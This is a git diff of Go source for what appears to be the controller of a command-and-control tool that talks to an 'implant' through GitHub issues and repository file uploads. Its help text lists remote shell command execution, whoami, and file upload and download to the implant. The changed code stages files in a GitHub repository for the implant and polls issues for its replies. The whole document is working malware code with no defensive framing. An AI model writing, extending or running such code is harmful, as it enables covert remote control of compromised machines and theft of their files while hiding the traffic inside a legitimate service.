@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -151,44 +152,54 @@ func findCommentBody(comment string) string {
 	return comment[start : start+end]
 }
 
-func fileUploadPostIssue(token, owner, repo, task string) error {
-	client := &http.Client{}
-	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/issues", owner, repo)
-
-	// 获取上传文件的路径和内容，写入到issue里面。
-	args := strings.Fields(task)
-	local_file_path := args[1]
-	data, err := ioutil.ReadFile(local_file_path)
+func uploadFile(token, user, repo, localFilePath, remoteFileName string) error {
+	// 读取本地文件内容
+	content, err := ioutil.ReadFile(localFilePath)
 	if err != nil {
-		return fmt.Errorf("failed in reading local_file: %v", local_file_path)
+		return fmt.Errorf("failed to read file: %v", err)
 	}
-	encoded := base64.StdEncoding.EncodeToString(data)
-	//fmt.Println(encoded)
 
-	payload := strings.NewReader(fmt.Sprintf(`{"title":"%s", "body":"%s"}`, task, encoded))
+	// 将文件内容进行 Base64 编码
+	encodedContent := base64.StdEncoding.EncodeToString(content)
 
-	req, err := http.NewRequest("POST", url, payload)
+	// 构造 GitHub API 的 URL
+	url := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/%s", user, repo, remoteFileName)
+
+	// 构造提交信息
+	requestBody, err := json.Marshal(map[string]string{
+		"message": "Add " + remoteFileName + " via API",
+		"content": encodedContent,
+	})
+	if err != nil {
+		return fmt.Errorf("failed to marshal request body: %v", err)
+	}
+
+	// 构造 HTTP 请求
+	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(requestBody))
 	if err != nil {
 		return fmt.Errorf("failed to create request: %v", err)
 	}
 
-	req.Header.Add("Authorization", "Bearer "+token)
-	req.Header.Add("Content-Type", "application/json")
-	req.Header.Add("Accept", "application/vnd.github+json")
+	// 设置请求头
+	req.Header.Set("Authorization", "token "+token)
+	req.Header.Set("Accept", "application/vnd.github.v3+json")
 
+	// 发送请求
+	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
-		return fmt.Errorf("failed in HttpSendRequest: %v", err)
+		return fmt.Errorf("failed to send request: %v", err)
 	}
-	fmt.Println(resp)
 	defer resp.Body.Close()
 
-	_, err = ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return fmt.Errorf("failed to read response: %v", err)
+	// 处理响应
+	if resp.StatusCode == http.StatusCreated {
+		fmt.Println(fmt.Sprintf("upload file %s to github success...", localFilePath))
+	} else {
+		body, _ := ioutil.ReadAll(resp.Body)
+		return fmt.Errorf("failed to upload file: %s", string(body))
 	}
 
-	fmt.Println("[+] Issue Created!")
 	return nil
 }
 
@@ -197,8 +208,8 @@ func printHelp() {
 	fmt.Println("pwd : print working directory")
 	fmt.Println("whoami : get username")
 	fmt.Println("cmd <command> : execute command")
-	fmt.Println("upload <local_file_path> <remote_file_path> : upload local file to the implant")
-	fmt.Println("download <remote_file_path> <local_file_path> : download file of implant to local path")
+	fmt.Println("upload <local_file_path> <remote_file_name> : upload local file to the implant")
+	fmt.Println("download <remote_file_name> <local_file_path> : download file of implant to local path")
 	fmt.Println("exit : kill the connection with the implant")
 }
 
@@ -225,9 +236,9 @@ func main() {
 		reader := bufio.NewReader(os.Stdin)
 		task, err := reader.ReadString('\n')
 		task = strings.TrimSpace(task)
-		fmt.Println(task)
+		//fmt.Println(task)
 		if err != nil {
-			fmt.Println("读取命令发生错误：", err)
+			fmt.Println("read commnad error：", err)
 			continue
 		}
 		if task == "pwd" || task == "whoami" || task == "exit" || strings.HasPrefix(task, "cmd") {
@@ -259,17 +270,18 @@ func main() {
 			}
 		} else if strings.HasPrefix(task, "upload") {
 			fmt.Printf("task: %s\n", task)
-			//if err := PostIssue(token, owner, repo, task); err != nil {
-			//	fmt.Println(Error("Failed to post issue", err))
-			//	continue
-			//}
-			if err := fileUploadPostIssue(token, owner, repo, task); err != nil {
+			if err := PostIssue(token, owner, repo, task); err != nil {
 				fmt.Println(Error("Failed to post issue", err))
 				continue
 			}
+
+			fmt.Println("waiting for the file upload...")
 			start_time := time.Now()
 			success_flag := false
-			fmt.Print("waiting for the file upload...")
+			args := strings.Fields(task)
+			local_file_path := args[1]
+			remote_file_name := args[2]
+			uploadFile(token, owner, repo, local_file_path, remote_file_name)
 			// 写个循环检测文件是否已经上传完成
 			for {
 				issueNbrStr := fmt.Sprintf("%d", issueNbr)
@@ -286,17 +298,16 @@ func main() {
 					}
 					if decoded == "upload success" {
 						success_flag = true
-						break
 					}
+					time.Sleep(1 * time.Second)
+					break
 				}
-				time.Sleep(1 * time.Second)
-				fmt.Print(".")
 			}
 			if success_flag == true {
 				usertime := time.Since(start_time)
-				fmt.Println("\nfile upload success, time-consuming: ", usertime)
+				fmt.Println("file upload success, time-consuming: ", usertime)
 			} else {
-				fmt.Println("\nfile upload fail, please try again")
+				fmt.Println("file upload fail, please try again")
 			}
 			issueNbr++
 		} else if strings.HasPrefix("download", task) {
